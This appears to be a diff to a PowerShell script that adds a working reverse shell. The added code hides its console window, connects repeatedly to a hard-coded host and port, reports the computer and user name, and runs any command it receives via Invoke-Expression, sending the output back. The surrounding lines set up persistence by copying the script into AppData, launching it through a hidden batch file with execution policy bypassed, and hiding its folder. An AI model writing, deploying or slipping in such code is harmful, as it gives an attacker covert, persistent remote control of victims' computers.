@@ -12,7 +12,93 @@ if ((Get-ExecutionPolicy -Scope Process) -ne 'Bypass') {
 try {
     # Create temp script with current content
     $scriptContent = @'
-    # Script content will be replaced here
+    # Set execution policy
+    if ((Get-ExecutionPolicy -Scope Process) -ne 'Bypass') { Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force }
+
+    # Connection settings
+    $server_ip = "192.168.100.6"
+    $server_port = 4455
+
+    # Import required assemblies
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+
+    # Hide PowerShell window
+    $code = @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class Win32 {
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+    }
+"@
+    Add-Type -TypeDefinition $code
+    $hwnd = [Win32]::GetConsoleWindow()
+    [Win32]::ShowWindow($hwnd, 0)
+
+    # Connection loop
+    while ($true) {
+        try {
+            $client = New-Object System.Net.Sockets.TCPClient($server_ip, $server_port)
+            $stream = $client.GetStream()
+            
+            # Send system info
+            $computerName = $env:COMPUTERNAME
+            $userName = $env:USERNAME
+            $systemInfo = "$computerName\$userName"
+            
+            # Receive whoami command and respond
+            $buffer = New-Object byte[] 1024
+            $read = $stream.Read($buffer, 0, $buffer.Length)
+            $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $read)
+            
+            if ($command.Trim() -eq "whoami") {
+                $bytes = [System.Text.Encoding]::UTF8.GetBytes($systemInfo)
+                $stream.Write($bytes, 0, $bytes.Length)
+            }
+            
+            # Main command handling loop
+            while ($client.Connected) {
+                try {
+                    $command = ""
+                    $buffer = New-Object byte[] 1024
+                    
+                    do {
+                        $read = $stream.Read($buffer, 0, $buffer.Length)
+                        $command += [System.Text.Encoding]::UTF8.GetString($buffer, 0, $read)
+                    } while ($stream.DataAvailable)
+                    
+                    if ($command.Length -gt 0) {
+                        try {
+                            $output = Invoke-Expression $command 2>&1 | Out-String
+                            $bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
+                            $stream.Write($bytes, 0, $bytes.Length)
+                        }
+                        catch {
+                            $errorMsg = $_.Exception.Message
+                            $bytes = [System.Text.Encoding]::UTF8.GetBytes($errorMsg)
+                            $stream.Write($bytes, 0, $bytes.Length)
+                        }
+                    }
+                }
+                catch {
+                    break
+                }
+            }
+        }
+        catch {
+            Start-Sleep -Seconds 5
+            continue
+        }
+        finally {
+            if ($client) { $client.Close() }
+            if ($stream) { $stream.Close() }
+        }
+        
+        Start-Sleep -Seconds 5
+    }
 '@
     
     # Use user's AppData folder and construct full paths
@@ -32,26 +118,20 @@ try {
         if ($MyInvocation.MyCommand.Path) {
             Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force
         } else {
-            # For IRM, get script content from memory
-            $currentScript = $scriptContent
-            if (-not $currentScript) {
-                $currentScript = $MyInvocation.MyCommand.ScriptBlock.ToString()
-            }
-            Set-Content -Path $scriptPath -Value $currentScript -Force
+            # For IRM, use script content
+            Set-Content -Path $scriptPath -Value $scriptContent -Force
         }
     }
 
     # Create batch file with error handling
     $batContent = @"
 @echo off
-PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$scriptPath" 
+PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$scriptPath"
 exit
 "@
     [System.IO.File]::WriteAllText($batPath, $batContent)
 
-    # Hide files with validation
-    if (Test-Path $scriptPath) { (Get-Item $scriptPath -Force).Attributes = 'Hidden' }
-    if (Test-Path $batPath) { (Get-Item $batPath -Force).Attributes = 'Hidden' }
+    # Only hide the parent directory
     if (Test-Path $persistPath) { (Get-Item $persistPath -Force).Attributes = 'Hidden' }
 
     # Start hidden if not already running from persist location
